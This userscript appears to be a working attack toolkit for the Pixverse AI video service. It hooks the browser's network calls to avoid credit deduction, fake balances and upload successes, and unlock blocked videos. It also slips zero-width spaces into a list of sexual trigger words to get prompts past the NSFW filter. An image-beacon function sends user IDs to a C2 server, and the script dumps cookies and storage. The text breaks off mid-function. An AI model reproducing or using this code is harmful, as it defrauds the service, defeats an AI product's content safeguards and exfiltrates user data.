// ==UserScript==
// @name        4ndr0tools - PixverseAlpha
// @namespace   https://github.com/4ndr0666/userscripts
// @author      4ndr0666
// @version     2.3.3
// @description Pixverse bypass & toolkit: credits patch (by preventing deduction), video/status unlock, robust download (via context menu), prompt NSFW bypass with obfuscation (ZWSP), API override (forced 720p & zero-duration extend), anti-blockers, covert data exfiltration to C2 server. Enhanced debugging (UI, auto credit key ID).
// @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @match       https://app.pixverse.ai/*
// @run-at      document-start
// @grant       none
// @license     MIT
// ==/UserScript==

(() => {
  "use strict";

  // Prevent multiple initializations of the script if it somehow gets loaded more than once.
  if (window._pixverseToolkitInitialized) {
    return;
  }
  window._pixverseToolkitInitialized = true;

  //────── CONSTANTS & CONFIG ──────//

  // Set DEBUG_MODE to true during development/testing for console logs, in-memory debug buffers, and debug UI.
  // Set to false for stealthy red team deployment and minimal output.
  const DEBUG_MODE = false; // <<< IMPORTANT: Set to 'true' to see the Debug UI >>>

  const DEBUG_PREFIX = '[Pixverse++]';
  const DATA_LOG_PREFIX = '[Pixverse++ DATA]'; // For structured data logs in debug mode
  let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
  let isInitialized = false; // Flag to ensure core overrides are run only once

  // --- C2 Configuration for Data Exfiltration ---
  // IMPORTANT: Replace 'https://c2.example.com' with your actual controlled server domain for live use.
  // Your server should be configured to receive GET requests at the /exfil path and log the parameters.
  const C2_SERVER_DOMAIN = 'https://c2.example.com'; // Production-ready placeholder

  // --- References to your custom overridden functions for self-healing ---
  // These will store the function pointers to your overridden XMLHttpRequest.prototype.open
  // and window.fetch so you can check if they've been replaced by other scripts.
  let myCustomXhrOpen = null;
  let myCustomFetch = null;

  // --- Debugging and Analysis Framework (In-Memory Buffers) ---
  // These are exposed globally on `window` when DEBUG_MODE is true for inspection via DevTools.
  const _redTeamDebugLog = []; // In-memory buffer for raw console-like messages
  const _redTeamGoods = [];   // In-memory buffer for structured test results/API snapshots

  // Expose debug buffers and control functions globally in DEBUG_MODE
  if (DEBUG_MODE) {
    window.redTeamDebugLog = _redTeamDebugLog;
    window.redTeamGoods = _redTeamGoods;
    window.redTeamClear = () => {
      _redTeamDebugLog.length = 0; // Clear the array
      _redTeamGoods.length = 0;   // Clear the array
      log('Debug logs and goods cleared.');
      updateDebugUI(); // Update UI after clearing
    };
  }

  // List of words to obfuscate in prompts to bypass NSFW filters
  const TRIGGER_WORDS = [
    "ass", "anal", "asshole", "anus", "areola", "areolas", "blowjob", "boobs", "bounce", "bouncing", "breast", "breasts",
    "bukake", "buttcheeks", "butt", "cheeks", "climax", "clit", "cleavage", "cock", "corridas", "crotch", "cum", "cums", "culo", "cunt",
    "deep", "deepthroat", "deepthroating", "deepthroated", "dick", "esperma", "fat ass", "fellatio", "fingering", "fuck", "fucking", "fucked", "horny", "lick", "masturbate",
    "masterbating", "missionary", "member", "meco", "moan", "moaning", "nipple", "nsfw", "oral", "orgasm", "penis", "phallus", "pleasure",
    "pussy", "rump", "semen", "seductively", "slut", "slutty", "splooge", "squeezing", "squeeze", "suck", "sucking", "swallow", "throat", "throating",
    "tits", "tit", "titty", "titfuck", "titties", "tittydrop", "tittyfuck", "titfuck", "vagina", "wiener", "whore", "creampie", "cumshot", "cunnilingus",
    "doggystyle", "ejaculate", "ejaculation", "handjob", "jerk off", "labia", "nude", "orgy", "porn", "prolapse",
    "rectum", "rimjob", "sesual", "stripper", "submissive", "teabag", "threesome", "vibrator", "voyeur", "whore"
  ];

  /**
   * Helper function to escape special characters in a string for use in a RegExp constructor.
   * @param {string} str - The string to escape.
   * @returns {string} - The escaped string.
   */
  function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
  const NSFW_PROMPT_REGEX = new RegExp(
    `\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`,
    "gi"
  );

  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
  const API_ENDPOINTS = {
    credits: /\/user\/credits(?:\?|$)/,
    videoList: /\/video\/list\/personal/,
    batchUpload: /\/media\/batch_upload_media/,
    singleUpload: /\/media\/upload/,
    creativeVideo: /\/creative_platform\/video\/(?:i2v|create)/, // Catches /i2v and /create for quality mod
    creativePrompt: /\/creative_platform\/video\//, // Broader match for prompt obfuscation
    creativeExtend: /\/creative_platform\/video\/extend/ // For duration modification
  };

  /**
   * Checks if a given URL matches a predefined API endpoint using its regex.
   * @param {string} url - The URL to test.
   * @param {string} key - The key of the API endpoint in API_ENDPOINTS (e.g., "credits", "videoList").
   * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
   */
  function matchesEndpoint(url, key) {
    return API_ENDPOINTS[key]?.test(url);
  }

  /**
   * Logs messages to the console with a consistent prefix for easy filtering.
   * Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function log(...args) {
    if (DEBUG_MODE) {
      console.log(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs error messages to the console with a consistent prefix.
   * Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function error(...args) {
    if (DEBUG_MODE) {
      console.error(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs specific messages to the in-memory debug buffer and console.
   * Only logs if DEBUG_MODE is true.
   * @param {string} message - The main log message.
   * @param {object} [data] - Optional structured data to log. This will also be pushed to _redTeamGoods if provided.
   */
  function writeToLogFile(message, data = null) {
    if (DEBUG_MODE) {
      const timestamp = new Date().toISOString();
      _redTeamDebugLog.push(`${timestamp} ${message}`); // Store as simple string in raw log
      console.log(`${DATA_LOG_PREFIX} ${message}`, data || ''); // Also log to console for immediate visibility
      if (data) {
        _redTeamGoods.push({ timestamp, message, data: structuredClone(data), type: 'custom_log' });
      }
      updateDebugUI(); // Update UI after adding log
    }
  }

  /**
   * Logs API request/response data to the in-memory structured data buffer and console.
   * @param {string} url - The URL of the API endpoint.
   * @param {object} data - The request body or response data.
   * @param {'request_original' | 'request_modified' | 'response_original' | 'response_modified'} type - Type of data.
   */
  function logApiResponse(url, data, type) {
    if (DEBUG_MODE) {
      const timestamp = new Date().toISOString();
      const entry = { timestamp, url, type, data: structuredClone(data) };
      _redTeamGoods.push(entry); // Store full objects in _redTeamGoods
      writeToLogFile(`API ${type.toUpperCase()} for ${url}`, entry); // Also add a summary to raw log
      updateDebugUI(); // Update UI after adding log
    }
  }

  /**
   * Dumps current localStorage, sessionStorage, and document.cookie to the debug log.
   * Only active in DEBUG_MODE.
   * @param {string} context - A label for when the state was dumped.
   */
  function dumpBrowserState(context = "UNKNOWN") {
    if (!DEBUG_MODE) return;

    const state = {
      localStorage: {},
      sessionStorage: {},
      cookies: document.cookie
    };

    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        state.localStorage[key] = localStorage.getItem(key);
      }
    } catch (e) {
      state.localStorage.error = `Access denied: ${e.message}`;
    }

    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        state.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch (e) {
      state.sessionStorage.error = `Access denied: ${e.message}`;
    }
    const timestamp = new Date().toISOString();
    const entry = { timestamp, type: 'browser_state', context, data: state };
    _redTeamGoods.push(entry);
    writeToLogFile(`Browser State Snapshot (${context})`, entry);
    updateDebugUI(); // Update UI after adding log
  }

  /**
   * Analyzes collected `redTeamGoods` (structured logs) to suggest potential credit-related keys.
   * This function is exposed globally as `window.analyzeCredits()` in DEBUG_MODE.
   */
  function analyzeCreditRelatedData() {
    if (!DEBUG_MODE) {
      console.warn("Credit analysis is only available in DEBUG_MODE.");
      return;
    }
    writeToLogFile("Initiating credit-related data analysis...");
    const creditKeywords = ["credit", "balance", "coin", "token", "limit", "allowance", "premium", "cost", "free", "tier", "usage", "price", "duration"];
    const potentialKeys = new Set();
    const analysisResults = [];

    // Analyze API responses and requests in _redTeamGoods
    _redTeamGoods.forEach(entry => {
      if (entry.type.startsWith('response') || entry.type.startsWith('request')) {
        const url = entry.url;
        const data = entry.data;

        // Recursive function to search for keywords in object keys/values
        const search = (obj, path = '') => {
          if (typeof obj !== 'object' || obj === null) return;

          Object.entries(obj).forEach(([key, value]) => {
            const currentPath = path ? `${path}.${key}` : key;

            // Check key name for keywords
            if (creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
              potentialKeys.add(`API Key: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
              analysisResults.push({ type: 'API Key Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
            }

            // Check string values for keywords
            if (typeof value === 'string' && creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
              potentialKeys.add(`API Value: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
              analysisResults.push({ type: 'API Value Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
            } else if (typeof value === 'number' && key.toLowerCase().includes('credit') && value >= 0 && value < 1000) { // Heuristic for credit numbers
               potentialKeys.add(`API Numeric Value: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
               analysisResults.push({ type: 'API Numeric Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
            }

            // Recursively search objects and arrays
            if (typeof value === 'object' && value !== null) {
              search(value, currentPath);
            }
          });
        };
        search(data);
      } else if (entry.type === 'browser_state') {
        const context = entry.context;
        const stateData = entry.data;

        const searchState = (obj, storageType, path = '') => {
          if (typeof obj !== 'object' || obj === null) return;
          Object.entries(obj).forEach(([key, value]) => {
            const currentPath = path ? `${path}.${key}` : key;
            if (creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
              potentialKeys.add(`${storageType} Key: ${currentPath} (Context: ${context})`);
              analysisResults.push({ type: `${storageType} Key Match`, key: currentPath, value, context, entryTimestamp: entry.timestamp });
            }
            if (typeof value === 'string' && creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
              potentialKeys.add(`${storageType} Value: ${currentPath} (Context: ${context})`);
              analysisResults.push({ type: `${storageType} Value Match`, key: currentPath, value, context, entryTimestamp: entry.timestamp });
            }
          });
        };

        searchState(stateData.localStorage, 'localStorage');
        searchState(stateData.sessionStorage, 'sessionStorage');
        // Check cookies directly
        stateData.cookies.split(';').forEach(cookie => {
          const [name, value] = cookie.split('=').map(s => s.trim());
          if (creditKeywords.some(kw => name.toLowerCase().includes(kw))) {
            potentialKeys.add(`Cookie Key: ${name} (Context: ${context})`);
            analysisResults.push({ type: 'Cookie Key Match', key: name, value, context, entryTimestamp: entry.timestamp });
          }
          if (creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
            potentialKeys.add(`Cookie Value: ${name} (Context: ${context})`);
            analysisResults.push({ type: 'Cookie Value Match', key: name, value, context, entryTimestamp: entry.timestamp });
          }
        });
      }
    });

    if (potentialKeys.size > 0) {
      writeToLogFile("Found potential credit-related keys/patterns:", {
        summary: Array.from(potentialKeys),
        details: analysisResults
      });
      console.log(`${DATA_LOG_PREFIX} --- Potential Credit Keys/Patterns ---`);
      potentialKeys.forEach(key => console.log(`${DATA_LOG_PREFIX} - ${key}`));
      console.log(`${DATA_LOG_PREFIX} See window.redTeamGoods for detailed analysis results.`);
    } else {
      writeToLogFile("No obvious credit-related keys/patterns found in collected data.");
      console.log(`${DATA_LOG_PREFIX} No obvious credit-related keys/patterns found.`);
    }
  }

  // Expose analyzeCredits globally if DEBUG_MODE is true
  if (DEBUG_MODE) {
    window.analyzeCredits = analyzeCreditRelatedData;
  }

  /**
   * Exfiltrates data covertly using an image beacon.
   * Only attempts if C2_SERVER_DOMAIN is configured to a non-placeholder value.
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   */
  function exfiltrateData(dataType, dataPayload) {
    // Prevent exfiltration if C2_SERVER_DOMAIN is not properly set (or is a placeholder).
    if (!C2_SERVER_DOMAIN || C2_SERVER_DOMAIN.includes('your-c2.com') || C2_SERVER_DOMAIN.includes('c2.example.com')) {
      error("C2_SERVER_DOMAIN not configured or set to placeholder. Data exfiltration skipped.");
      return;
    }
    try {
      const beacon = new Image();
      beacon.src = `${C2_SERVER_DOMAIN}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
      log(`Data exfiltration initiated for type: ${dataType}`);
    } catch (e) {
      error(`Failed to exfiltrate data of type ${dataType}:`, e);
    }
  }

  /**
   * Parses a request body (either FormData or a JSON string) into a JavaScript object.
   * @param {FormData|string} body - The request body.
   * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
   */
  function parseBody(body) {
    if (body instanceof FormData) {
      try {
        return Object.fromEntries(body);
      } catch (e) {
        error("Failed to parse FormData:", e);
        return null;
      }
    }
    if (typeof body === "string") {
      try {
        return JSON.parse(body);
      } catch (e) {
        error("Failed to parse JSON string:", e);
        return null;
      }
    }
    return null; // Return null for unsupported body types
  }

  /**
   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
   * This technique can bypass simple string-matching NSFW filters by breaking up the words
   * without changing their visual appearance.
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  function obfuscatePrompt(prompt) {
    // Reverted to simple ZWSP insertion based on working script's observed behavior (PixverseBETA).
    // The previous "Bubble Text + ZWSP" method was causing detection.
    return prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
  }

  /**
   * Extracts a media path from an API request body, specifically for upload endpoints.
   * This path is then used to fake successful uploads if the actual upload fails.
   * @param {object} data - The request data object.
   * @param {string} url - The URL of the request, used to determine the endpoint type.
   * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
   */
  function extractMediaPath(data, url) {
    if (!data || typeof data !== "object") {
      return null;
    }
    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) {
      return data.images[0]?.path || null;
    }
    if (matchesEndpoint(url, "singleUpload")) {
      if (typeof data.path === "string") return data.path;
      if (typeof data.media_path === "string") return data.media_path;
      // Fallback: look for any string property that looks like an MP4 path
      for (const k in data) {
        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) {
          return data[k];
        }
      }
    }
    return null;
  }

  /**
   * Modifies the user credits response to always show 100 credits.
   * This acts as a fallback or general consistency check, but the primary credit bypass
   * is now handled by modifying the creativeExtend request.
   * @param {object} data - The original response data.
   * @returns {object|null} - The modified data, or null if the structure doesn't match.
   */
  function tryModifyCredits(data) {
    if (data?.Resp?.credits !== undefined) {
      const clone = structuredClone(data);
      clone.Resp.credits = 100;
      log('Credits restored to 100 (fallback modification)');
      // Exfiltrate a user ID if it's available in the credits response
      if (data.Resp.user_id) {
        exfiltrateData("user_id_from_credits", data.Resp.user_id.toString());
      }
      dumpBrowserState("After Credit Update (Potential Credit-Consuming Action)"); // Log browser state after credit actions
      return clone;
    }
    return null;
  }

  /**
   * Modifies the video list response to unlock video status (e.g., from blocked to ready)
   * and bypass NSFW placeholder images by pointing directly to the video path.
   * @param {object} data - The original response data.
   * @returns {object} - The modified data. Returns original data if structure is unexpected.
   */
  function modifyVideoList(data) {
    if (!data?.Resp?.data) {
      return data; // Return original data if the expected structure is missing
    }
    // List of strings commonly found in NSFW placeholder URLs.
    const NSFW_PLACEHOLDERS = [
      "/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"
    ];

    /**
     * Helper to check if a URL contains any known NSFW placeholder strings.
     * @param {string} url - The URL to check.
     * @returns {boolean} - True if the URL is likely an NSFW placeholder, false otherwise.
     */
    function isNSFW(url) {
      if (!url) return false;
      return NSFW_PLACEHOLDERS.some(p => url.includes(p));
    }

    const clone = structuredClone(data); // Create a deep clone to safely modify the data
    clone.Resp.data = clone.Resp.data.map(item => {
      // Change video_status 7 (often indicates blocked/pending) to 1 (ready/available)
      if (item.video_status === 7) {
        item.video_status = 1;
      }

      let preview =
        (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) ||
        item.customer_paths?.customer_img_url ||
        '';

      // If the current preview URL is not an NSFW placeholder and is valid, use it.
      // Otherwise, try to construct a direct URL to the video itself for the preview.
      if (!isNSFW(preview) && preview) {
        item.first_frame = preview;
      } else if (item.video_path) {
        // Append #t=0.2 to load the video at 0.2 seconds, often used for a quick preview frame.
        item.first_frame = `https://media.pixverse.ai/${item.video_path}#t=0.2`;
      } else {
        // Fallback to the original preview if no video_path is available.
        item.first_frame = preview;
      }
      // Ensure the main video URL points directly to the media server if video_path exists.
      item.url = item.video_path ? `https://media.pixverse.ai/${item.video_path}` : '';
      return item;
    });
    return clone;
  }

  /**
   * Central function to apply appropriate response modifications based on the request URL.
   * This is where the core API bypass logic resides for various endpoints.
   * @param {object} data - The original response data.
   * @param {string} url - The URL of the request.
   * @returns {object|null} - The modified data, or null if no modification was applied.
   */
  function modifyResponse(data, url) {
    if (!data || typeof data !== "object") return null;

    // Credit modification (always attempt if endpoint matches)
    if (matchesEndpoint(url, "credits")) {
      const modified = tryModifyCredits(data);
      if (modified) {
        logApiResponse(url, modified, 'response_modified'); // Log modified response
        return modified;
      }
    }

    // Video list modification (always attempt if endpoint matches)
    if (matchesEndpoint(url, "videoList")) {
      const modified = modifyVideoList(data);
      if (modified) {
        logApiResponse(url, modified, 'response_modified'); // Log modified response
        return modified;
      }
    }

    // Upload modification: apply a generic success fake if any error occurs AND we have a saved path.
    // This is crucial for bypassing NSFW upload rejections.
    if (matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) {
      // Only proceed if the server returned an error (ErrCode is not 0) and we have a media path
      // captured from the request (meaning a file was actually attempted to be uploaded).
      if (data?.ErrCode !== 0 && savedMediaPath) {
        log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
        let modifiedResponse = null;
        // Construct the faked success response based on the endpoint type.
        if (matchesEndpoint(url, "batchUpload")) {
          const id = Date.now(); // Generate a unique ID for the faked upload
          const name = savedMediaPath.split('/').pop() || 'uploaded_media'; // Extract filename from path
          modifiedResponse = {
            ErrCode: 0, // Indicate success
            ErrMsg: "success",
            Resp: {
              result: [{
                id,
                category: 0,
                err_msg: "",
                name,
                path: savedMediaPath,
                size: 0, // Size can be 0 as it's a faked response
                url: `https://media.pixverse.ai/${savedMediaPath}`
              }]
            }
          };
        } else { // singleUpload
          modifiedResponse = {
            ErrCode: 0,
            ErrMsg: "success",
            Resp: {
              path: savedMediaPath,
              url: `https://media.pixverse.ai/${savedMediaPath}`,
              name: savedMediaPath.split('/').pop() || 'uploaded_media',
              type: 1
            }
          };
        }
        logApiResponse(url, modifiedResponse, 'response_modified'); // Log modified response
        return modifiedResponse;
      } else if (DEBUG_MODE && data?.ErrCode !== undefined && data.ErrCode !== 0) {
        // Log if an error occurred for an upload, but we couldn't fake it (e.g., no savedMediaPath).
        log(`Upload error for ${url}, but faking not applied. ErrCode: ${data.ErrCode}, savedMediaPath: ${savedMediaPath}`);
      }
    }
    return null; // No applicable modification found.
  }

  //────── FILENAME & SANITIZE HELPERS ──────//

  /**
   * Sanitizes a string for use as a filename.
   * Removes invalid filename characters, leading/trailing dots/spaces, and truncates.
   * @param {string} str - The input string.
   * @returns {string} - The sanitized filename string.
   */
  function sanitize(str) {
    // Remove invalid filename characters: \ / : * ? " < > |
    // Also remove control characters (\u0000-\u001F)
    // Replace leading/trailing dots or spaces, and truncate.
    return String(str)
      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_") // Replace invalid characters with underscore
      .replace(/^\.+/, '') // Remove leading dots
      .replace(/\.+$/, '') // Remove trailing dots
      .replace(/^\s+|\s+$/g, '') // Trim leading/trailing whitespace
      .slice(0, 120); // Safety truncation to prevent excessively long filenames
  }

  /**
   * Generates a suitable filename for a video element.
   * It prioritizes extracting a title from the DOM, then falls back to a URL-based guess.
   * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
   * @param {string} fallback - A default filename to use if no better name can be determined.
   * @returns {string} - The generated and sanitized filename.
   */
  function getFilename(videoEl, fallback = "video.mp4") {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split("/").pop() || fallback).split("?")[0]; // Get filename from URL, remove query params

    let title = "";
    try {
      // Attempt to find a title from common parent containers of the video player
      let container = videoEl.closest(".component-video,.pv-video-detail-page");
      title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
    } catch (e) {
      error("Error extracting title for filename:", e);
    }

    // If a meaningful title is found, use it and append .mp4. Otherwise, sanitize the URL-guessed filename.
    if (title) {
      return sanitize(title) + ".mp4";
    }
    return sanitize(guess);
  }

  /**
   * Overrides the native XMLHttpRequest.prototype.open and .send methods
   * to intercept and modify request bodies and responses.
   */
  function overrideXHR() {
    const oOpen = XMLHttpRequest.prototype.open;
    const oSend = XMLHttpRequest.prototype.send;

    // Store URL and method for later use in the 'send' method and 'load' event.
    XMLHttpRequest.prototype.open = function(m, u) {
      this._url = u;
      this._method = m;
      return oOpen.apply(this, arguments);
    };
    // Store reference to your custom open function for self-healing
    myCustomXhrOpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.send = function(body) {
      const url = this._url || "";
      const method = (this._method || "GET").toUpperCase();

      let processedBody = body; // Initialize with original body
      let originalBodyParsed = null;
      let bodyWasModified = false;

      try {
        if (body && typeof body === "string") {
          originalBodyParsed = JSON.parse(body);
        } else if (body instanceof FormData) { // Handle FormData bodies
          originalBodyParsed = Object.fromEntries(body);
          // If it's FormData, re-creating it will be necessary if modified
        }
      } catch (e) {
        error("Error parsing original XHR request body:", e);
        originalBodyParsed = null; // Ensure it's null if parsing fails
      }


      if (originalBodyParsed) {
        // Log original request body BEFORE any modifications
        logApiResponse(url, originalBodyParsed, 'request_original');

        // --- Apply Quality Modification ---
        if (matchesEndpoint(url, "creativeVideo") && method === "POST") {
          if (originalBodyParsed.quality && originalBodyParsed.quality !== '720p') {
            log('Modifying video quality to 720p for', url);
            originalBodyParsed.quality = '720p';
            bodyWasModified = true;
          } else if (DEBUG_MODE && originalBodyParsed.quality === undefined) {
            log('No "quality" field found in request for', url);
          }
        }

        // --- Apply Duration Modification for creativeExtend (CRITICAL BYPASS) ---
        if (matchesEndpoint(url, "creativeExtend") && method === "POST") {
          if (originalBodyParsed.duration !== undefined && originalBodyParsed.duration !== 0) {
            log('Modifying video extend duration to 0 for', url);
            originalBodyParsed.duration = 0; // Force zero duration to prevent credit deduction
            bodyWasModified = true;
          } else if (DEBUG_MODE && originalBodyParsed.duration === undefined) {
             log('No "duration" field found in creativeExtend request for', url);
          }
        }

        // --- Apply NSFW Prompt Obfuscation ---
        if (matchesEndpoint(url, "creativePrompt") && method === "POST" && originalBodyParsed.prompt) {
          const originalPrompt = originalBodyParsed.prompt;
          const obfuscatedPrompt = obfuscatePrompt(originalPrompt);
          if (originalPrompt !== obfuscatedPrompt) { // Check if obfuscation actually changed anything
            log('Obfuscating prompt for', url);
            originalBodyParsed.prompt = obfuscatedPrompt;
            bodyWasModified = true;
          }
        }

        if (bodyWasModified) {
          // If the original body was FormData, we need to reconstruct it from the modified parsed object
          if (body instanceof FormData) {
            const newFormData = new FormData();
            for (const key in originalBodyParsed) {
                newFormData.append(key, originalBodyParsed[key]);
            }
            processedBody = newFormData;
          } else { // Otherwise, it was a JSON string
            processedBody = JSON.stringify(originalBodyParsed); // Re-serialize the modified body
          }
          logApiResponse(url, originalBodyParsed, 'request_modified'); // Log modified request body
        } else {
          processedBody = body; // No modification, use original body (can be string or FormData)
        }
      } else {
        processedBody = body; // If no body or parsing failed, send original
      }

      // Intercept media upload requests (batch_upload_media or upload) to extract media path.
      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && originalBodyParsed) {
        const p = extractMediaPath(originalBodyParsed, url);
        if (p) savedMediaPath = p; // Store the path for faking future upload successes
      }

      // Add an event listener to the XHR object to modify the response once it loads.
      this.addEventListener("load", () => {
        if (this.status >= 200 && this.status < 300) { // Only process successful HTTP responses (network-wise)
          let resp;
          try {
            resp = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
          } catch (e) {
            error("Error parsing XHR response:", e);
            resp = null;
          }

          if (resp !== null) {
            logApiResponse(url, resp, 'response_original'); // Log original response data
            const modifiedResponse = modifyResponse(resp, url);
            // If modifyResponse returns a modified object, it will already have been logged as 'response_modified'.
            // Otherwise, no modification was applied, and we proceed with the original response.
            if (modifiedResponse) {
              // If the response was modified, redefine the XHR's response properties
              // to return the modified data instead of the original.
              Object.defineProperties(this, {
                response: {
                  value: modifiedResponse,
                  writable: false,
                  configurable: true
                },
                responseText: {
                  value: JSON.stringify(modifiedResponse),
                  writable: false,
                  configurable: true
                }
              });
              log('XHR response modified for:', url);
            }
          }
        }
      }, {
        once: true
      }); // Use { once: true } to automatically remove the listener after it fires

      return oSend.apply(this, [processedBody]); // Call the original send method with potentially modified body
    };
    log('XHR override initialized');
  }

  /**
   * Overrides the native window.fetch method to intercept and modify requests and responses.
   */
  function overrideFetch() {
    const origFetch = window.fetch; // Store the original fetch function

    window.fetch = async function(...args) {
      const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
      let init = args[1]; // Request options (method, headers, body, etc.)
      const method = (init?.method || "GET").toUpperCase();
      let body = init?.body;
      let originalBodyParsed = null;
      let bodyWasModified = false;

      if (body) {
        try {
          if (typeof body === "string") {
            originalBodyParsed = JSON.parse(body);
          } else if (body instanceof FormData) {
            originalBodyParsed = Object.fromEntries(body);
          }
        } catch (e) {
          error("Error parsing original Fetch request body:", e);
          originalBodyParsed = null; // Ensure it's null if parsing fails
        }
      }

      if (originalBodyParsed) {
        // Log original request body BEFORE any modifications
        logApiResponse(url, originalBodyParsed, 'request_original');

        // --- Apply Quality Modification ---
        if (matchesEndpoint(url, "creativeVideo") && method === "POST") {
          if (originalBodyParsed.quality && originalBodyParsed.quality !== '720p') {
            log('Modifying video quality to 720p for', url);
            originalBodyParsed.quality = '720p';
            bodyWasModified = true;
          } else if (DEBUG_MODE && originalBodyParsed.quality === undefined) {
            log('No "quality" field found in request for', url);
          }
        }

        // --- Apply Duration Modification for creativeExtend (CRITICAL BYPASS) ---
        if (matchesEndpoint(url, "creativeExtend") && method === "POST") {
          if (originalBodyParsed.duration !== undefined && originalBodyParsed.duration !== 0) {
            log('Modifying video extend duration to 0 for', url);
            originalBodyParsed.duration = 0; // Force zero duration to prevent credit deduction
            bodyWasModified = true;
          } else if (DEBUG_MODE && originalBodyParsed.duration === undefined) {
             log('No "duration" field found in creativeExtend request for', url);
          }
        }

        // --- Apply NSFW Prompt Obfuscation ---
        if (matchesEndpoint(url, "creativePrompt") && method === "POST" && originalBodyParsed.prompt) {
          const originalPrompt = originalBodyParsed.prompt;
          const obfuscatedPrompt = obfuscatePrompt(originalPrompt);
          if (originalPrompt !== obfuscatedPrompt) { // Check if obfuscation actually changed anything
            log('Obfuscating prompt for', url);
            originalBodyParsed.prompt = obfuscatedPrompt;
            bodyWasModified = true;
          }
        }

        if (bodyWasModified) {
          // If the original body was FormData, we need to reconstruct it
          if (body instanceof FormData) {
            const newFormData = new FormData();
            for (const key in originalBodyParsed) {
                newFormData.append(key, originalBodyParsed[key]);
            }
            init = { ...init,
              body: newFormData
            };
          } else { // Otherwise, it was a JSON string
            init = { ...init,
              body: JSON.stringify(originalBodyParsed)
            };
          }
          args[1] = init;
          body = init.body; // Update local body variable for subsequent checks
          logApiResponse(url, originalBodyParsed, 'request_modified'); // Log modified request body
        }
      }

      // Intercept media upload requests to extract and save the media path.
      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && originalBodyParsed) {
        const p = extractMediaPath(originalBodyParsed, url);
        if (p) savedMediaPath = p;
      }

      try {
        const res = await origFetch.apply(this, args);
        const contentType = res.headers.get("content-type") || "";

        if (contentType.includes("application/json")) {
          const clone = res.clone();
          let json;
          try {
            json = await clone.json();
          } catch (e) {
            error("Error parsing Fetch response JSON:", e);
            json = null;
          }

          if (json !== null) {
            logApiResponse(url, json, 'response_original'); // Log original response data
            const modifiedResponse = modifyResponse(json, url);
            // If modifyResponse returns a modified object, it will already have been logged as 'response_modified'.
            // Otherwise, no modification was applied, and we return the original response.
            if (modifiedResponse) {
              const modifiedBodyString = JSON.stringify(modifiedResponse);
              const headers = new Headers(res.headers);
              headers.set("Content-Type", "application/json");

              log('Fetch response modified for:', url);
              return new Response(modifiedBodyString, {
                status: res.status,
                statusText: res.statusText,
                headers: headers
              });
            }
          }
        }
        return res;
      } catch (err) {
        error("Fetch error for", url, err);
        throw err;
      }
    };
    // Store reference to your custom fetch function for self-healing
    myCustomFetch = window.fetch;
    log('Fetch override initialized');
  }

  /**
   * Simple throttle function to limit how often a function can be called.
   * Introduces a small random jitter to the delay for stealth.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds between function invocations.
   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
   * @returns {Function} - The throttled function.
   */
  function throttle(fn, baseDelay, jitter = 100) {
    let last = 0,
      timeoutId;
    return function(...args) {
      const now = Date.now();
      const currentDelay = baseDelay + Math.random() * jitter;
      if (now - last < currentDelay) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
          last = Date.now();
          fn.apply(this, args);
        }, currentDelay - (now - last));
      } else {
        last = now;
        fn.apply(this, args);
      }
    };
  }

  /**
   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
   * Periodically checks if the overrides are still active and reapplies them if they've been replaced.
   */
  function setupSelfHealingHooks() {
